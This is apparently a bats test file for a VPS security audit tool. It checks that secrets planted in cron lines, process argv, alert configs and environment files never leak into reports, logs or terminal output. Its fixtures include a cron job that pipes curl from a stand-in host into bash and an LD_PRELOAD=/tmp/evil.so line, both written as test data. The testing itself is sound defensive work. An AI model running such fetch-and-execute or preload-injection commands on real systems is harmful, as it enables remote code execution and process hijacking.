#!/usr/bin/env bats
# A secret planted where the audit looks (a cron line, a process's argv, the
# alert config) must not reach checks.json, the three reports, the log, the
# terminal or --json-only stdout. Findings name where to look, never the value.

load helpers.bash

CANARY="CanaryS3cret9f8e7d6c"

setup() {
    _vpssec_load core/distro.sh core/state.sh core/security_levels.sh core/report.sh
    i18n_load en_US
    VPSSEC_INCLUDE=""
    VPSSEC_EXCLUDE=""
    state_init

    local m
    for m in filesystem scheduling malware alerts; do
        # shellcheck source=/dev/null
        source "$(_vpssec_repo_root)/modules/$m.sh"
    done

    SPOOL_DIR="$BATS_TEST_TMPDIR/spool"
    mkdir -p "$SPOOL_DIR"
    cron_spool_dir() { printf '%s\n' "$SPOOL_DIR"; }
}

teardown() {
    if [[ -n "${CANARY_PID:-}" ]]; then
        kill "$CANARY_PID" 2>/dev/null || true
    fi
}

# Silence every malware detector except the ones named. Crypto-miner findings
# keep full argv by design, so that detector stays silent and no canary may
# look like a miner.
_malware_arm() {
    local fn keep
    while read -r fn; do
        for keep in "$@"; do
            [[ "$fn" == "$keep" ]] && continue 2
        done
        eval "${fn}() { :; }"
    done < <(grep -oE '^_malware_check_[a-z0-9_]+' "$(_vpssec_repo_root)/modules/malware.sh")
}

_plant_cron() {
    printf '*/5 * * * * curl -fsSL -H "Authorization: Bearer %s" https://agent.example.invalid/run.sh | bash\n' \
        "$CANARY" > "$SPOOL_DIR/deploy"
}

# A busy process with a password in argv. The PID is past pid_max, so /proc
# never answers for it and the finding falls back to argv[0].
_plant_ps() {
    _vpssec_stub_script ps <<SH
case "\$*" in
    *pcpu,pid,etimes,args*) echo "95.0 999999999 3600 ffmpeg -i rtsp://admin:$CANARY@cam.invalid/1" ;;
    *-p*) exit 1 ;;
esac
exit 0
SH
}

_plant_alerts() {
    jq -n --arg url "https://hooks.slack.com/services/T0/B0/$CANARY" \
          --arg mail "ops-$CANARY@example.invalid" \
          '{webhook_url: $url, email: $mail}' > "$ALERTS_CONFIG_FILE"
}

_run_audits() {
    VPSSEC_QUIET_SCAN=0
    scheduling_audit
    _fs_audit_cron
    malware_audit
    alerts_audit
}

_desc_of() {
    jq -r --arg id "$1" '.[] | select(.id == $id) | .desc' "$VPSSEC_STATE/checks.json"
}

# Every file the run wrote, minus the alert config that legitimately holds it.
_refute_canary_on_disk() {
    local hits
    hits=$(grep -rlF "$CANARY" "$VPSSEC_STATE" "$VPSSEC_REPORTS" "$VPSSEC_LOGS" \
               --exclude=alerts.json 2>/dev/null || true)
    if [[ -n "$hits" ]]; then
        echo "canary found in: $hits"
        return 1
    fi
}

@test "canary: cron, argv and alert-config secrets reach no report, log or terminal" {
    _malware_arm _malware_check_cpu_anomaly
    _plant_cron
    _plant_ps
    _plant_alerts

    run _run_audits
    [ "$status" -eq 0 ]
    [[ "$output" != *"$CANARY"* ]]

    # The findings fired and say where to look; otherwise "no canary" is vacuous.
    [[ "$(_desc_of scheduling.cron_fetches_internet)" == *"$SPOOL_DIR/deploy:1"* ]]
    [[ "$(_desc_of filesystem.suspicious_cron)" == *"deploy"* ]]
    [[ "$(_desc_of malware.cpu_anomaly)" == *"PID 999999999 (95%): ffmpeg"* ]]
    [ -n "$(_desc_of alerts.configured)" ]

    VPSSEC_JSON_ONLY=1
    run report_generate_all
    [ "$status" -eq 0 ]
    jq -e . <<<"$output" >/dev/null
    [[ "$output" != *"$CANARY"* ]]

    VPSSEC_JSON_ONLY=0
    VPSSEC_QUIET_SCAN=0
    confirm() { return 0; }
    run report_generate_all
    [ "$status" -eq 0 ]
    [[ "$output" != *"$CANARY"* ]]

    [ -s "$VPSSEC_REPORTS/summary.md" ]
    [ -s "$VPSSEC_REPORTS/summary.sarif" ]
    _refute_canary_on_disk
}

@test "canary: a password on an LD_PRELOAD line reaches no report, log or terminal" {
    _malware_arm _malware_check_ld_preload
    MALWARE_ENV_FILES=("$BATS_TEST_TMPDIR/environment")
    printf '%s\n' "export DB_PASSWORD=$CANARY LD_PRELOAD=/tmp/evil.so API_TOKEN=$CANARY" \
        > "${MALWARE_ENV_FILES[0]}"

    run _run_audits
    [ "$status" -eq 0 ]
    # The finding fired; otherwise "no canary" below is vacuous.
    [[ "$(_desc_of malware.ld_preload)" == *"LD_PRELOAD=/tmp/evil.so"* ]]
    [[ "$output" != *"$CANARY"* ]]
    _refute_canary_on_disk

    VPSSEC_JSON_ONLY=1
    run report_generate_all
    [ "$status" -eq 0 ]
    [[ "$output" != *"$CANARY"* ]]
    VPSSEC_JSON_ONLY=0
    _report_write_files
    _refute_canary_on_disk
    # Where to look, and what was preloaded.
    [ "$(_desc_of malware.ld_preload)" = "${MALWARE_ENV_FILES[0]}:1: LD_PRELOAD=/tmp/evil.so" ]
}

@test "canary: a hidden process is reported by its binary, not its argv" {
    [[ -r /proc/self/cmdline ]] || skip "needs /proc"
    _malware_arm _malware_check_hidden_processes
    _plant_ps

    # Detached from bats's output fds, or bats waits for sleep to finish; the
    # trailing `:` stops bash exec-ing sleep, which would drop the argv.
    bash -c 'sleep 60; :' "--db-password=$CANARY" </dev/null >/dev/null 2>&1 &
    CANARY_PID=$!
    local i
    for ((i = 0; i < 50; i++)); do
        tr '\0' ' ' < "/proc/$CANARY_PID/cmdline" 2>/dev/null | grep -qF "$CANARY" && break
        sleep 0.1
    done
    tr '\0' ' ' < "/proc/$CANARY_PID/cmdline" | grep -qF "$CANARY"

    _malware_get_proc_pids() { printf '%s\n' "$CANARY_PID"; }
    _malware_get_ps_pids() { :; }

    run malware_audit
    [ "$status" -eq 0 ]
    # Whatever /proc names as the binary: under emulation (Rosetta, qemu-user)
    # that is the emulator, not bash.
    [ "$(_desc_of malware.hidden_processes)" = "PID $CANARY_PID: $(readlink "/proc/$CANARY_PID/exe")" ]

    _report_write_files
    _refute_canary_on_disk
}
